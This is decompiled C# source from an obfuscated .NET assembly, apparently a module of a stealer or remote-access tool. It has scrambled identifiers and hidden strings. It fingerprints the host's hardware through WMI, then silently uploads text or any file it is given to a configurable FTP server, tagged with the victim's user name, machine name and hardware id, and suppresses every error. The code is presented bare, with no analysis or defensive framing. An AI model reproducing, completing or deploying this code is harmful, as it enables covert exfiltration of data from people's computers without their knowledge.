using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace JNgWsfAJdq;

internal sealed class fkiONJkXtes
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string AVnEuNMFEQQ()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107364603));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107364614)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107364565);
			ManagementObject val3 = new ManagementObject(getString_0(107364592) + text2 + getString_0(107364551));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107364514)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107352261) : text;
		}
	}

	public static void rgZQTnMVGYfFd(string mAsZaNpcRgZifmA = "URL", string JdCTilqDtNzEZ = "USERNAME", string dwoJuYQfOXVbekZZ = "ACCESO", string CVuwOQkaHKy = "")
	{
		try
		{
			string text = AVnEuNMFEQQ();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(mAsZaNpcRgZifmA + getString_0(107365623) + Environment.UserName + getString_0(107365642) + Environment.MachineName + getString_0(107365589) + text + getString_0(107365616));
			ftpWebRequest.Method = getString_0(107364521);
			ftpWebRequest.Credentials = new NetworkCredential(JdCTilqDtNzEZ, dwoJuYQfOXVbekZZ);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(CVuwOQkaHKy);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void ZBkgeKIejBXVf(string rwRUnFzmqZGly = "URL", string JApVwgDglpXQa = "USERNAME", string tDrtuVmocdQa = "ACCESO", string VZcwYXWKdGNiV = "")
	{
		try
		{
			string text = AVnEuNMFEQQ();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(rwRUnFzmqZGly + getString_0(107365623) + Environment.UserName + getString_0(107365642) + Environment.MachineName + getString_0(107365589) + text + getString_0(107365589) + Path.GetFileName(VZcwYXWKdGNiV));
			ftpWebRequest.Method = getString_0(107364521);
			ftpWebRequest.Credentials = new NetworkCredential(JApVwgDglpXQa, tDrtuVmocdQa);
			byte[] array = File.ReadAllBytes(VZcwYXWKdGNiV);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static fkiONJkXtes()
	{
		Strings.CreateGetStringDelegate(typeof(fkiONJkXtes));
	}
}
